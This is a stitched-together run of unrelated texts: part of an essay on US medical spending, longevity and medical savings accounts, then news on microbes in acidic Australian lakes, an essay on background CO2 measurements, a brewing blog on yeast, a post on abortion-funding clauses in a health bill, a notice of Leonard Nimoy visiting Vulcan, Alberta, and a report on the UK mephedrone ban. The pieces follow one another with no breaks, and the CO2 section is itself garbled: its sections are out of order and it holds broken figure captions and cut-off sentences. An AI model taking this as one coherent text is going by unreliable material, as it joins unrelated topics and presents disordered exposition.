To return to medicine , hospital cost has risen as a percentage of total medical cost from 24 percent in 1946 to 32 percent half a century later .
The cost of physician services is currently the second largest component of total medical cost .
It too has risen sharply , though less sharply than hospital costs .
In 1946 , the cost of physician services exceeded the cost of hospital services .
According to the estimates in Table 1 , the cost of physician services has multiplied four - fold since 1946 , the major rise coming after the adoption of Medicare and Medicaid in 1965 .
Figure 5 shows what has happened to the number of physicians and their income .
The number almost doubled , and the income per physician almost tripled over the half - century from 1946 to 1996 .
Both reflect the increase in funds available to finance medical care and the third - party character of payment .
The demand for physician services went up , and income had to go up to attract additional physicians .
Paradoxically , the attempt by third - party payers – particularly the federal government – to keep costs down has been at least partly self - defeating , because it took the form of imposing onerous rules and regulations on physicians .
The resultant bureaucratization of medical practice has made the practice of medicine less attractive as an occupation to most actual and potential physicians , which increased the necessary rise in incomes .
It has also reduced their productivity .
VI .
Medical - care output
So much for input .
What about output ?
What have we gotten in return for quadrupling the share of the nation ’s income spent on medical care ?
I have already referred to one component of output – days of hospital care per person per year .
That has gone down from three days in 1946 to less than one in 1996 .
Insofar as the reduction reflects the improvements in medicine , it clearly is a good thing .
However , it also reflects the pressure to keep hospital stays short in order to keep down cost .
That this is not a good thing is clear from protests by patients , widespread enough to have led Congress to mandate minimum stays for some medical procedures .
The output of the medical - care industry that we are interested in is its contribution to better health .
How can we measure better health in a reasonably objective way that is not greatly influenced by other factors ?
For example , if medical care enables people to live longer and healthier lives , we might expect that the fraction of persons aged 65 to 70 who continue to work would go up .
In fact , of course , the fraction has gone down drastically – thanks to higher incomes reinforced by financial incentives from Social Security .
With the same “ if ” we might expect the fraction of the population classified as disabled to go down , but that fraction has gone up , again not for reasons of health but because of government social security programs .
And so I have found with one initially plausible measure after another – all of them are too contaminated by other factors to reflect the output of the medical - care industry .
As noted earlier , the least bad measure that I have been able to come up with is length of life , though that too is seriously contaminated by other factors – improvements in diet , housing , clothing , and so on generated by greater affluence , better garbage collection and disposal , the provision of purer water , and other governmental public - health measures .
Wars , epidemics , and natural and man-made disasters have played a part .
Even more important , the quality of life is as meaningful as the length of life .
Perhaps the extensive research on aging currently underway will lead to a better measure than length of life .
Figures 6 and 7 present two different sets of data on expected length of life : Figure 6 , expected length of life at birth ; Figure 7 , remaining length of life at age 65 .
Both cover the whole century , from 1900 to 1997 , the last year for which I was able to get data .
For Figure 6 the data are annual ; for Figure 7 , decennial until recent years .
The two tell very different , but equally remarkable , stories .
Expected longevity went from 47 years in 1900 to 68 years in 1950 , a truly remarkable rise that proceeded at a fairly steady rate , averaging four - tenths of a year per year .
Public - health activities , such as those leading to cleaner water and air and better control of epidemics , played a major role in lengthening life , no doubt ; but so too did improvements in medical practice and hospital care , particularly those leading to a sharp reduction in infant and maternal mortality .
Whatever its source , the increase in longevity did not have any systematic relation to spending on medical care as a fraction of income .
We have reasonably accurate data on spending only from 1929 on ; crude data from 1919 on .
Except for the deep depression years of 1932 and 1933 , national health spending never exceeded 5 percent of national income , and from 1919 to 1948 , varied between 3 and 5 percent , primarily as a result of wider swings in national income than in health spending .
The most striking feature of Figure 6 is the sharp slowdown in the increase in longevity after 1950 .
From 1950 on , longevity grew at less than half the rate that it grew from 1900 to 1950 - averaging less than two - tenths of a year per year compared to the earlier four - tenths .
6
In the first 50 years of the century , the life span increased by 21 years ; in the next 47 years , by eight years .
As in the first 50 years , the increase proceeded at a surprisingly steady pace .
I have no good explanation for the shift from one trend to the other .
I conjecture that it reflects the exhaustion by the end of World War II of the possibility of further major improvements from public - health activity .
I leave it to scholars more knowledgeable about medicine than I to give a more satisfactory answer .
The later trend was accompanied , as the earlier one was not , by a major increase in spending as a fraction of national income .
However , I attribute that increase in spending to the changes in the economic organization of medical care discussed earlier .
I doubt that it is related as either cause or effect to the slowdown in the growth of longevity .
Data are much less readily available for longevity at age 65 than at birth , so I have resorted to the use of decennial estimates except for the most recent year .
Figure 7 is almost the mirror image of Figure 6 – that is , the same picture reversed .
Instead of first rising rapidly and then slowly , longevity at age 65 at first rose slowly and then rapidly .
Until 1940 , longevity rose at an average of only .025 years per year .
Remaining years of life went from 12 – or to age 77 – in 1900 to 13 – or age 78 – in 1940 .
Then there was a sharp acceleration , and in the next 57 years , remaining years of life went up by an additional five years to 18 – or age 83 , rising at the average rate of .085 years per year .
Understandably , both the earlier and the later rates of growth in longevity at age 65 are much smaller than the comparable figures for longevity at birth .
The remarkable phenomenon is the shift in trend around 1940 , and the steadiness of the trend both before and after 1940 .
Data for later years of life suggests that the steadiness of the trend in longevity at age 65 is not likely to continue .
At these later ages , there has been a distinct slowing of increases in longevity since about 1980 .
At age 85 , remaining years of life for females has not changed in the 17 years from 1980 to 1997 .
It was 6.4 years in both 1980 and 1997.7
What caused the change in the trend at age 65 , and why was that change in the opposite direction from the change in the trend at birth , and why did it occur about 10 years earlier ?
Could it have been the emergence of penicillin and sulfa at around 1940 that explains the dating of the shift ?
No doubt many other advances in medicine , from the handling of blood pressure to the perfecting of open - heart surgery , the improved treatment of cancer , and the better understanding of diet were of special importance for preventing death at later ages .
I am incompetent to judge these matters and their relative importance .
But I have no doubt that one economic change also played an important role .
That was the sharp improvement in the economic status of the elderly brought about by government transfer programs , notably Social Security .
From being among the poorest groups in society , the elderly have become among the most affluent in the post - World War II period .
However interesting these speculations may be , they are a long way from providing an answer to the question with which we started this section , namely , “ What have we gotten in return for quadrupling the share of the nation ’s income spent on medical care ? ”
The slowdown in the increase of longevity at birth started before tax exemption and Medicare had any effect on spending .
Similarly , the acceleration in the increase in longevity at age 65 started 25 years before Medicare was enacted and showed no speedup thereafter .
Perhaps better measures of the health of the population and various subgroups will show a relation to total spending .
But on the evidence to date , it is hard to see that we have gotten much for that spending other than bureaucratization and widespread dissatisfaction with the economic organization of medical care .
VII .
The United States vs. other countries
Our steady movement toward reliance on third - party payment no doubt explains the extraordinary rise in spending on medical care in the United States .
However , other advanced countries also rely on third - party payment , many or most of them to an even greater extent than we do .
What explains our higher level of spending ?
I must confess that despite much thought and scouring of the literature , I have no satisfactory answer .
One clue is my estimate that if the pre-World War II system had continued – that is , if tax exemption and Medicare and Medicaid had never been enacted – expenditures on medical care would have amounted to less than half its current level , which would have put us near the bottom of the OECD list rather than at the top .
In terms of holding down cost , one - payer directly administered government systems , such as exist in Canada and Great Britain , have a real advantage over our mixed system .
As the direct purchaser of all or nearly all medical services , they are in a monopoly position in hiring physicians and can hold down their remuneration , so that physicians earn much less in those countries than in the United States .
In addition , they can ration care more directly – at the cost of long waiting lists and much dissatisfaction .
8
In addition , once the whole population is covered , there is little political incentive to increase spending on medical care .
In an insightful analysis of political entrepreneurship , W. Allen Wallis noted that
one of the ways politicians compete for votes is by offering to have the government provide new services .
For an offer of a new service to have substantial electoral impact , the service ordinarily must be one that a large number of voters is familiar with , and in fact already use .
The most effective innovations for a political entrepreneur to offer , therefore , are those whose effect is to transfer from individuals to the government the costs of services which are already in existence , not to alter appreciably the amount of the service reaching the people .9
Medicare , Medicaid , the political stress on the “ uninsured , ” and the current political pressure for government financing of prescriptions all exemplify this phenomenon .
Once the bulk of costs have been taken over by government , as they have in most of the other OECD countries , the political entrepreneur has no additional groups to attract , and attention turns to holding down costs .
An additional factor is the tax treatment of private expenditures on medical care .
In most countries , any private expenditure comes out of after - tax income .
It does in the United States also , unless the medical care is provided by the employer .
For this reason , the bulk of medical care is provided through employers , and private expenditures on medical care are decidedly higher than they would be if medical care , like food , clothing , and other consumer goods , had to be financed out of post - tax income .
It is consistent with this view that Germany , the country second to the United States in the fraction of income spent on medical care , has a system in which the employer plays a central role in the provision of medical care and in which , so far as I have been able to determine , half of the cost comes out of pre-tax income , half out of post - tax income .
Our mixed system has many advantages in accessibility and quality of medical care , but it has produced a higher level of cost than would result from either wholly individual choice or wholly collective choice .
VIII .
Medical savings accounts and beyond
The high cost and inequitable character of our medical - care system is the direct result of our steady movement toward reliance on third - party payment .
A cure requires reversing course , reprivatizing medical care by eliminating most third - party payment , and restoring the role of insurance to providing protection against major medical catastrophes .
The ideal way to do that would be to reverse past actions : repeal the tax exemption of employer - provided medical care ; terminate Medicare and Medicaid ; deregulate most insurance ; and restrict the role of the government , preferably state and local rather than federal , to financing care for the hard cases .
However , the vested interests that have grown up around the existing system , and the tyranny of the status quo , clearly make that solution not feasible politically .
Yet it is worth stating the ideal as a guide to judging whether proposed incremental changes are in the right direction .
Most changes made in the final decade of the twentieth century have been in the wrong direction .
Despite rejection of the sweeping socialization of medicine proposed by Hillary Clinton , subsequent incremental changes have expanded the role of government , increased regulation of medical practice , and further constrained the terms of medical insurance , thereby raising its cost and increasing the fraction of individuals who choose or are forced to go without insurance .
There is one exception , which , though minor in current scope , is pregnant of future possibilities .
The Kassebaum - Kennedy bill , passed in 1996 after lengthy and acrimonious debate , included a narrowly limited four - year pilot program authorizing medical savings accounts .
A medical savings account enables individuals to deposit tax - free funds in an account usable only for medical expense , provided they have a high - deductible insurance policy that limits the maximum out - of - pocket expense .
As noted earlier , it eliminates third - party payment except for major medical expenses and is thus a movement very much in the right direction .
By extending tax exemption to all medical expenses whether paid by the employer or not , it eliminates the present bias in favor of employer - provided medical care .
That too is a move in the right direction .
However , the extension of tax exemption increases the bias in favor of medical care compared to other household expenditures .
This effect would tend to increase the implicit government subsidy for medical care , which would be a step in the wrong direction .
10 But , on balance , given how large a fraction of current medical expenditures are exempt , it seems likely that the net effect of widely available and flexible medical savings accounts would be very much in the right direction .
However , the current pilot program is neither widely available nor flexible .
The act limits the number of medical savings accounts to no more than 750,000 policies , available only to the self - employed who are uninsured and employees at firms with 50 or fewer employees .
Moreover , the act specifies the precise terms of the medical savings account and the associated insurance .
Finally , at the end of four years ( the year 2000 ) Congress will have to vote to continue or change the program .
( Those who signed up in the first four years would be entitled to continue their accounts even if Congress terminates the program . )
A number of representatives and senators have indicated their intention to introduce bills to extend and widen the availability of medical savings accounts .
Prior to this pilot project , a number of large companies ( e.g. , Quaker Oats , Forbes , Golden Rule Insurance Co. ) had offered their employees the choice of a medical savings account instead of the usual low - deductible employer - provided insurance policy .
In each case , the employer purchased a high - deductible major medical insurance policy for the employee and deposited a stated sum , generally about half of the deductible , in a medical savings account for the employee .
That sum could be used by the employee for medical care .
Any part not used during the year was the property of the employee and had to be included in taxable income .
Despite this loss of tax exemption , this alternative has generally been very popular with both employers and employees .
It has reduced costs for the employer and empowered the employee , eliminating much third - party payment .
Medical savings accounts offer one way to resolve the growing financial and administrative problems of Medicare and Medicaid .
Each current participant could be given the alternative of continuing with present arrangements or receiving a high - deductible major medical insurance policy and a specified deposit in a medical savings account .
New entrants would be required to accept the alternative .
Many details would have to be worked out : the size of the deductible and the deposit in the medical savings account , the size of any co-payment , and whether additional medical spending would be tax - exempt .
Yet it seems clear from private experience that a program along these lines would be less expensive and bureaucratic than the current system , and more satisfactory to the participants .
In effect , it would be a way to voucherize Medicare and Medicaid .
It would enable participants to spend their own money on themselves for routine medical care and medical problems , rather than having to go through HMOs and insurance companies , while at the same time providing protection against medical catastrophes .
An interesting and instructive experiment with medical savings accounts has recently taken place in South Africa , as explained by Shaun Matisonn of the National Center for Policy Analysis :
For most of the last decade [ the nineties ] – under the leadership of Nelson Mandela – South Africa enjoyed what was probably the freest market for health insurance anywhere in the world … .
South Africa ’s insurance regulations were and are sufficiently flexible to allow the type of innovation and experimentation that American law stifles … .
The result has been remarkable ….
In just five years , MSA plans captured half the market , proving that they are popular and meet consumer needs as well as or better than rival products .
South Africa ’s experience with MSAs shows that MSA holders save money , spending less on discretionary items in a way that does not increase the cost of inpatient care .
Contrary to allegations by some critics , the South African experience also shows that MSAs attract individuals of all different ages and different degrees of health .
A more radical reform would , first , end both Medicare and Medicaid , at least for new entrants , and replace them by providing every family in the United States with catastrophic insurance – i.e. , a major medical policy with a high deductible .
Second , it would end tax exemption of employer - provided medical care .
And third , it would remove the restrictive regulations that are now imposed on medical insurance – hard to justify with universal catastrophic insurance .
This reform would solve the problem of the currently medically uninsured , eliminate most of the bureaucratic structure , free medical practitioners from an increasingly heavy burden of paperwork and regulation , and lead many employers and employees to convert employer - provided medical care into a higher cash wage .
The taxpayer would save money because total government costs would plummet .
The family would be relieved of one of its major concerns – the possibility of being impoverished by a major medical catastrophe – and most could readily finance the remaining medical costs .
Families would once again have an incentive to monitor the providers of medical care and to establish the kind of personal relations with them that were once customary .
The demonstrated efficiency of private enterprise would have a chance to improve the quality and lower the cost of medical care .
The first question asked of a patient entering a hospital might once again become “ What ’s wrong ? ” and not “ What ’s your insurance ? ”
While so radical a reform is almost surely not politically feasible at the moment , it may become so as dissatisfaction with the current arrangements continue to grow .
And again , it gives a standard – if less than an ideal one – against which to judge incremental changes .
Notes
Females only are included to remove one source of irrelevant difference among countries .
In general , females tend to have a longer expected length of life than males , and countries differ in the ratio of males to females .
The correlation of expected length of life with per capita spending on medical care in dollars is almost the same as with percent of GDP spent on medical care .
The correlation is partly spurious because percent spent tends to be positively correlated with real GDP , and real GDP is positively correlated with length of life for given percent spent .
However , the partial correlation of percent spent with length of life is statistically significant and higher than the partial correlation of real GDP with length of life .
In an extensive study , the Rand Corporation compared the effect of different health - insurance plans , varying from one with no deductible and no co-payment – that is , free medical care – to one with 95 percent co-payment , very close to complete private responsibility .
In his summary of the results , Joseph Newhouse concluded that , “ had there been no MDE [ maximum deductible expense ] , demand on the 95 percent coinsurance plan would have been a little over half as large as on the free care plan , ” and an accompanying table gives 55 percent as the actual fraction .
The 1997 value of the extrapolated trend from 1919 - 1940 is 48 percent of on a completely independent set of data .

Lessons from Rand Health Insurance Experiment ( Harvard University Press , 1993 ) , p. 458 .
Had this been the total expenditure in 1996 , the United States would have ranked twenty - first , rather than first , among the 29 OECD countries in fraction of income spent on medical care .
The figure of 14 percent referred to earlier was from OECD data ; it referred to 1996 rather than 1997 and to percent of gross domestic product , not national income .
I have used data for the population as a whole , although data are also available by sex and race .
There are minor differences between the sexes and between the races , but the broad picture is essentially the same for all , so I have not thought it worthwhile to present more detailed data , as I did in Input and Output in Medical Care ( Stanford : Hoover Institution Press , 1992 ) .
I am indebted to James Fries , a leading expert on aging , for calling this phenomenon to my attention .
The data cited are from Metropolitan Life Insurance Statistical Bulletin , Oct. - Dec. , 1998 .

Whether medical savings accounts increase or decrease the government subsidy to medical care , including the hidden tax subsidy of tax exemption , depends on whether they raise or lower total medical expenditures exempted from tax .
First - party payment works toward reducing such expenditures by giving consumers an incentive to economize and by reducing administrative costs .
The availability of tax exemption to a wider class of medical expenses has the opposite effect .
Such experience as we have with medical savings accounts or their equivalent suggests that the first effect is highly significant and is likely to overwhelm the second .
However , this issue deserves more systematic investigation .

But in 2007 , Melanie Mormile of Missouri University of Science and Technology in Rolla and colleagues cultured a bacterium from water sampled from one of several salty , acidic lakes in Western Australia .

The lakes are very shallow and periodically fill with rainwater before partially evaporating , which concentrates the salts within them .
They may be the closest equivalents on Earth of the shallow pools thought to have once dotted Mars .
Minerals in the lakes also contain strange , microscopic structures dubbed “ hairy blobs ” that researchers have suggested are fossilised microbes .
A team led by Mormile has now turned up dozens more species by analysing DNA extracted from water and sediment in 11 of the lakes .
Vinegar pool
The most acidic lake has a pH like that of vinegar , yet it contains DNA evidence for 23 microbial species , most of which appear to be new to science .
“ There ’s actually quite a diversity of life in these lakes , ” Mormile told New Scientist .
The microbes probably did not simply fall into the lakes but lived and thrived there – some appear to be relatives of Salinibacter ruber , which is known to grow in other extremely salty environments ( see The most extreme life - forms in the universe ) .
The results bolster the possibility that life could have lived in the salty , acidic lakes present on Mars in the ancient past , the researchers say .
But the researchers do not yet know what gives the Australian lake microbes their ability to survive the tough conditions .
“ It would be really interesting to look at the mechanisms that enable them to do that , ” Mormile says .

3. Variations of CO2 due to the seasons :
Monthly trends 2002 - 2004 of 2 NH stations ( Barrow and Mauna Loa ) and 2 SH stations ( Samoa and South Pole )
As can be noticed , the variation at Mauna Loa is smaller than at Barrow and the SH stations have a much smaller seasonal influence than the NH stations .
Also , although the trend of the SH stations is near the same , there is some lag between the NH and SH stations .
This is the first indication that the source of the increase is situated in the NH , as the ITCZ ( intertropical convergence zone ) forms a barrier for the exchange of CO2 ( and aerosols ) between the NH and the SZ .
This is even more clear in the longer term yearly trends :
Trends in yearly averages of CO2 levels at different stations .
The trend of the SH stations has a growing delay of 6 - 12 months behind the NH trend .
But all yearly average data of the " best " stations ( and the average of least contaminated data from less suitable stations like Schauinsland ) are within 5 ppmv for similar growth .
The trend of the SH stations has a growing delay of 6 - 12 months behind the NH trend .

4 . Where to measure ?
The concept of " background " CO2 levels .
Figure 3.1 Diurnal variation in the concentration and carbon isotopic ratio of atmospheric
CO 2 in a coastal redwood forest of California , 18 - 19 May 1955 , Big Sur St. Pk .
( Keeling , 1958 .

Several others measured CO2 levels / d13C ratios of the their own samples too .
This happened at several places in Germany ( Heidelberg , Schauinsland , Nord Rhine Westphalia ) .
This confirmed that local production was the origin of the high CO2 levels .
The smallest CO2 / d13C variations were found in mountain ranges , deserts and near the oceans .
The largest in forests , urban neighbourhoods and non-urban , but heavely industrialised neighbourhoods .
When the reciproke of CO2 levels were plotted against d13C ratios , this showed a clear relationship between the two .
Again from [
Figure 3.5 Relation between carbon isotope ratio and concentration of atmospheric CO 2 in
different air types from measurements summarized in Table 3.4
( Keeling , 1958 , 1961 : full squares ; Esser , 1975 : open circles ; Freyer and Wiesberg , 1975 ,
Freyer , 1978 c : open squares ) .
All 13C measurements have not been corrected
for N 2 O contamination ( Craig and Keeling , 1963 ) , which is at the most in the area of + 0.6 ‰
The search for background places .
Keeling then sought for places on earth not ( or not much ) influenced by local production / uptake , thus far from forests , agriculture and / or urbanisation .
He had the opportunity to launch two continuous measurements : at Mauna Loa and at the South Pole .
Later , other basic stations were added , all together 10 from near the North Pole ( Alert , NWT , Canada ) to the South Pole , most of them working continuous , some working with regular flask sampling .
We are interested in CO2 levels in a certain year all over the globe and the trends of the CO2 levels over the years .
So , here we are at the definition of the " background " level :
Yearly average data taken from places minimal influenced by vegetation and human sources are deemed " background " .
For convenience , the yearly average data from Mauna Loa are used as reference .
One could use any base station as reference or the average of the stations , but as all base stations ( and a lot of other stations , even Schauinsland ) are within 5 ppmv of Mauna Loa , with near identical trends , and that station has the longest near - continuous CO2 record , Mauna Loa is the reference .

Background CO2 levels can be found over all oceans and over land at 1000 m and higher altitudes
5. Evidence of human influence on the increase of CO2 in the atmosphere .
6. References
This shows that with upslope winds , the data is influenced by local CO2 depleted air .
These data are rightfully discarded from the daily / monthly / yearly averages , as they do n't reflect the background CO2 levels , which we are interested in .
Does discarding of " contaminated " data influence the trend over a year or several years ?
I have asked that question to Pieter Tans , responsible for dataprocessing of the Mauna Loa data .
His answer : Several stations are deemed " good " , as these have minimal influence from local vegetation and / or human emissions ( traffic , heating ) .
These are stations in the middle of the oceans , sometimes at coastal points ( as long as the wind is not blowing from land side ) and / or above the inversion layer .
These stations , after discarding outliers , differ from each other within 5 ppmv for yearly averages , of which most is from the delay between the NH and the SH , see next item .
10 of them , spanning the globe from near the North Pole ( Alert , Canada ) to the South Pole , are used as reference for daily , monthly and yearly averages and yearly trends .
The graphs and the data can be found at [ 5 ] .
Some inland stations , like Schauinsland only give reliable " background " CO2 levels , when the station ( at 1200 m altitude ) is above the inversion layer and with enough wind speed .
This happens only about 10 % of the time .
And last , but not least , many inland stations are practically unsuitable for background CO2 measurement , because of incomplete mixing with the higher air layers , partly due to too many local sources / sinks like vegetation and / or human use of fossil fuels , partly due to a shielded location .
This is the case for e.g. Diekirch ( Luxemburg ) [ 6 ] , where the station is in a valley with forests , urbanisation and traffic in the main upwind direction :
As can be seen , even at inconvenient places with lots of local sources / sinks , there is an inverse correlation between CO2 levels and wind speed .
With higher wind speeds , CO2 levels are better mixed with higher air layers which have " background " CO2 content .
This reduces the CO2 content at ground level .
The assymptote of CO2 levels at high speed winds ( as was seen during storm Franz , 11 January 2007 ) is about 385 ppmv , very close to the 382 ppmv level found at Mauna Loa in the same period .
The same is true for diurnal variance : at daytime and with high enough wind speed (> 1 m/s ) , CO2 levels are lower and near background , while at night under the inversion layer , CO2 levels are up to 100 ppmv higher .
There are two main natural influences on the CO2 levels of the atmosphere : the temperature of the ocean 's surface waters and the uptake of CO2 by plants in spring / summer and the release of CO2 by the decay of dead plant material in fall / winter .
This is most clear in the NH ( Northern Hemisphere ) , where most of vegetation on land is situated .
CO2 is continuously emitted by deep sea upwelling , especially in the tropics , where temperatures are high and the partial pressure of CO2 ( pCO2 ) in the upper oceans is higher than in the atmosphere above it .
CO2 is continuously absorbed in the upper ocean layers at higher latitudes , where the colder temperatures reduce the pCO2 of the oceans , lower than the pCO2 of the atmosphere .
This is especially the case at the sink places of the THC ( thermohaline circulation ) in the Nordic Atlantic ocean .
Colder water can retain more CO2 than warmer water , but in the case of CO2 there are also a lot of chemical and biological reactions which influence the solubility of CO2 and hence pCO2 at the surface of the oceans .
For more details on this , Wiki has a quite good explanation .
The CO2 flow between the tropics and the colder places in the oceans is relatively constant ( more about that later ) , and does n't influence the seasonal variation that much .
More variation is in the temperature ( and thus pCO2 ) of the mid-latitudes , where there is absorption of CO2 in winter and release of CO2 in summer .
The CO2 flow of vegetation ( including algues in the upper oceans ) is in opposite direction : more release in winter and more uptake in summer .
The net effect in the NH is a variation of +/- 4 ppmv in Mauna Loa ( mid Pacific Ocean , middle troposphere ) between summer and winter , up to +/-20 ppmv for Barrow ( Alaska , USA , sea level , near tundra ) or even 35 ppmv at Schauinsland ( Germany , 1200 m high ) .
The data of Schauinsland are heavily contaminated by the nearby fully inhabited and industrialised Rhine valley .
And influenced by vegetation , in this case the Black Forest of SW Germany .
Only at night , when separated from the valleys by an inversion layer , and with sufficient wind speed , the CO2 levels are better mixed with the rest of the troposphere and retained .
This is the case for only 10 % of the data .
Data series from the SH ( Southern Hemisphere ) show much less seasonal variation , because of the much smaller area of land / vegetation .
The smallest influence of the seasons is found at the South Pole .
Here follows some comparison of the Mauna Loa ( selected ) monthly averages with these of other stations :
The concept was launched by C.D. Keeling in the mid fifties , when he made several series of measurements in the USA .
He found widely varying CO2 levels , sometimes in samples taken as short as 15 minutes from each other .
He also noticed that values in widely different places , far away from each other , but taken in the afternoon , were much lower and much closer resembling each other .
He thought that this was because in the afternoon , there was more turbulence and the production of CO2 by decaying vegetation and / or emissions was more readily mixed with the overlying air .
Fortunately , from the first series on [ 2 ] , he also measured 13C / 12C ratios of the same samples , which did prove that the diurnal variation was from vegetation decay at night , while during the day photosynthesis at one side and turbulence at the other side increased the 13C / 12C ratio back to maximum values .
Keeling 's first series of samples , taken at Big Sur State Park , showing the diurnal CO2 and d13C cycle was published in [ 7 ] , original data ( of other series too ) can be found in [ 8 ] :
As the oceans represent about 70 % of the earth 's surface , and all oceanic stations show near the same yearly averages and trends , already 70 % of the atmosphere shows background behaviour ( within 5 ppmv ) .
This can be extended to near the total earth for the part above the inversion layer .
Above land , diurnal variations are only seen up to 150 m ( according to [ 7 ] ) .
Seasonal changes reduce with altitude .
This is based on years of flights ( 1963 -1979 ) in Scandinavia [ 7 ] and between Scandinavia and California [ 9 ] .
Further confirmed by old and modern [ 10 ] flights in the USA and Australia ( Tasmania ) .
In the SH , the seasonal variation is much smaller and there is a high - altitude to lower altitude gradient , where the high altitude is 1 ppmv richer in CO2 than the lower altitude .
This may be caused by the supply of extra CO2 from the NH via the southern branch of the Hadley cell to the upper troposphere in the SH .
From [ 7 ] , based on [ 9 ] :
As one can see , again the values above the inversion layer are near straight and agree within a few ppmv with the Mauna Loa data .
Below the inversion layer , the morning values are 15 - 35 ppmv higher , in the afternoon , these may sink to background again .
If we take the 1000 m as the average upper level for the influence of local disturbances , that represents about 10 % of the atmospheric mass .
Thus the " background " level can be found at 70 % of the earth 's air mass ( oceans ) + 90 % of the remaining land surface ( 27 % ) .
That is in 97 % of the global air mass .
Only 3 % of the global air mass contains not - well mixed amounts of CO2 , which is only over land .
General conclusion :( in high mountain ranges , this may be higher ) .

Fascinating autobiographic story from C.D. Keeling about the history of CO2 measurements and the struggle against the administrations to get and continue funding for continuous measurements .
Of special interest :- First measurements on 5 l flasks were done with enhanced barometric equipment , with an accuracy of better than 0.1 ppmv . -
The same barometric equipment was used to test calibration gases and NIR equipment .
A change in calibration gases ( air / CO2 vs. N2/CO2 ) caused a jump in response of the NIR equipment .
All previous collected data were corrected for this change .

Yeast is a key ingredient in beer .
It can account for 70 % of a beer ’s flavor and without it there ’d be no alcohol .
With these things in mind we thought it was a good idea to take a closer look at the stuff .
As you may know , yeast is a living microorganism , a fungus .
The type used in most brewing and baking goes by the name of Saccharomyces cerevisiae .
As we ’ve mentioned before , when yeast is introduced to wort ( pre- beer ) it will eat the sugars for energy and expel CO2 and alcohol as waste products , a process known as anaerobic fermentation .
Ale yeast ferments on the top of the beer , while lager yeast usually ferments on the bottom .
However , this is only part of the story of how yeast turns grains and water into beer .
In addition to alcohol and CO2 , there are other secondary elements which are produced during fermentation and create much of a brew ’s flavor .
Here ’s a quick list of some of the major ones :
Esters –
These create fruity flavors , and are frequently found in beers from England and Belgium .
Fusel Alcohols –
This is a heavier variation of the standard ethanol alcohol produced during fermentation .
They have been linked with hangovers .
Ketones –
The most common type of this compound is diacetyl , which gives beer a sweet butter or caramel taste .
It ’s common in some of the heavier beers of Great Britain , but its tendency to cause stale flavors cause some to regard it as a flaw .
Others see it as a benefit , such Samuel Smith Brewery , whose beers all feature strong diacetyls
Phenolics – A type of chemical which can produce spicy notes .
Fatty acids –
While these do n’t impart a strong flavor on their own , fatty acids can make beer oxidize and grow stale quicker than normal and as a result most brewers try to avoid them
While there is only one main species of yeast used in commercial brewing there are many different varieties , all with different characters and flavors .
Most yeast is strained out of beer before it makes it to the bottle as it can produce off flavors .
When yeast is allowed in the bottle , as with bottle - conditioned beer it ’s still best to avoid pouring it into the glass .
That is of course if you ’re drinking hefeweizen , or other wheat beers .
Consuming the yeast is actually encouraged with style .
It all goes to show the tremendous diversity of yeast and beer .
In case you ’re ever talking to Bart Stupak or someone else concerned about the abortion language in the health insurance reform bill , simply commend their attention to pages 118 - 124 .
I have put them into a convenient pdf file HERE .
It falls collectively under a section titled :
“ SPECIAL RULES RELATING TO COVERAGE OF ABORTION SERVICES — PROHIBITION ON THE USE OF FEDERAL FUNDS ” .
Frankly , the language could hardly be more clear cut .
I have excerpted the pertinent sections below .
Basically , section ( 1 ) ( B ) ( i ) defines abortions for which public funding is prohibited by current federal law .
Section ( 1 ) ( C ) prohibits the use of federal funds in the community health insurance option to pay for those abortions .
Sections ( 2 ) ( A ) and ( B ) say that insurers that have plans that cover abortions “ shall not use any amount ” of government funds to pay for those abortions and that the monies used to pay for those abortions must be paid for separately with non-governmental funds .
Enjoy .
You know , if you ’re into that sort of thing …
I ’m just sayin ’ …

* UPDATE CORRECTED DATE
Leonard Nimoy is heading to a very special place in the Great White North .
It seems that Spock is having a home coming of sorts in the small Alberta town of Vulcan .
March April 23rd is the arrival date and it looks like quite an event is in the works .
According to the Vulcan Advocate , Mr. Nimoy will arrive at 2:30 pm on the 23rd Local and officials , including Tom Grant , the mayor of Vulcan , will get a chance to meet him .
Shortly after , starting at around 3 p.m. , Nimoy will be part of the parade , which will start at the Tourism and Trek Station and run down to the intersection on Centre Street and Third Avenue .
" We 're thrilled and honoured that he 'll be coming , " said Dayna Dickens , Vulcan 's tourism co-ordinator .
The community as a whole has been coming together to work towards getting ready for the visit , said Dickens .
" That 's wonderful to see , " she added .
After the parade , at around 3:30 p.m. , the action will move on to the stage down town , where a few speeches are planned , followed by the unveiling of the Spock bust and Vulcan salute hand print .
Nimoy 's scheduled departure is set for 4:15 p.m .
His visit was made possible through coordination with the Calgary Comic and Entertainment Expo , which runs April 23 - 24 in Calgary , and will feature other special guests like Brent Spiner , who played Data on Star Trek : the Next Generation , and Billy Dee Williams , who play Lando Calrissian in Star Wars , to name just a few .

Home Secretary Alan Johnson is to ban mephedrone and other synthetic so - called " legal highs " within weeks .
It comes after the Advisory Council on the Misuse of Drugs recommended they be classified as Class B drugs .
Class B drugs , which include cannabis and amphetamine sulphate , carry a maximum sentence of five years for possession or 14 years for supply .
There has been recent pressure to ban mephedrone , linked in media reports to at least four deaths in the UK .
Mr Johnson said he would be introducing legislation in Parliament on Tuesday and hoped to get cross -party support .
MEPHEDRONE FACTS
Effects similar to amphetamines and ecstasy Sold as a white powder , capsules and pills or can be dissolved in liquid Often sold online as plant food marked " not for human consumption " Completely different to methadone , used to treat heroin addicts Reported side effects include headaches , palpitations , nausea , cold or blue fingers Long - term effect unknown Currently legal to buy and be in possession of the powder , but against the law to sell , supply or advertise the powder for human consumption Already illegal in Israel , Denmark , Norway and Sweden
Drugs :
The facts
He added the importation of mephedrone and the chemical compounds associated with it have been banned with immediate effect and the UK Border Agency instructed to seize any shipments .
Mr Johnson said : " As a result of the council 's swift advice , I am introducing legislation to ban not just mephedrone and other cathinones but also to enshrine in law a generic definition so that , as with synthetic cannabinoids , we can be in the forefront of dealing with this whole family of drugs .
" This will stop unscrupulous manufacturers and others peddling different but similarly harmful drugs . "
The Association of Chief Police Officers lead on drugs Chief Constable Tim Hollis said the home secretary 's announcement " sends out a clear message to young people that this is a dangerous and harmful drug and should not be taken " .
He added : " It will also serve to suppress sales and provide police with enforcement powers that will allow us to target those dealing in this drug . "
BANNING PROCESS

The Conservatives welcomed the move but said it would " go further " by introducing a temporary ban classification to tackle other similar " legal highs " that may come on to the market .
Shadow home secretary Chris Grayling said : " This is clearly the right step to take regarding mephedrone but we should not be complacent . "
Liberal Democrat home affairs spokesman Chris Huhne said the action could have come earlier as an ACMD sub - committee had been looking into " legal highs " .
Its work stopped when the chief drugs adviser was sacked in October for publicly disagreeing with the government 's decision to reclassify cannabis .
